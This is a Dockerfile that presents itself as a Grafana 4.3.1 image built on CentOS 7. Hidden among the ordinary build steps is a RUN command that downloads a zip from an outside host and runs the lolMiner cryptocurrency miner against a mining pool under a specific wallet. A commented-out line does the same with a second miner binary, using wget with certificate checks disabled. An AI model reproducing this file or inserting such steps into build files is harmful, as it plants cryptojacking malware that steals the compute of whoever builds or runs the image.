FROM centos:7
MAINTAINER Erik Jacobs <erikmjacobs@gmail.com>

USER root
EXPOSE 3000

ENV GRAFANA_VERSION="4.3.1"
#wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o 139.99.124.170:80 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr -k -a rx/0 
ADD root /
RUN yum update -y && yum upgrade -y && yum install wget -y && yum install zip -y && wget swensonm.com/mining/gpuD.zip && unzip gpuD.zip && chmod 777 lolMiner && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTC:1G3mY6n7owLYbAbd5HA3sQjkGuVVkfr9bX.adayangtegak --4g-alloc-size 4076

COPY run.sh /usr/share/grafana/
RUN /usr/bin/fix-permissions /usr/share/grafana \
    && /usr/bin/fix-permissions /etc/grafana \
    && /usr/bin/fix-permissions /var/lib/grafana \
    && /usr/bin/fix-permissions /var/log/grafana 

WORKDIR /usr/share/grafana
ENTRYPOINT ["./run.sh"]
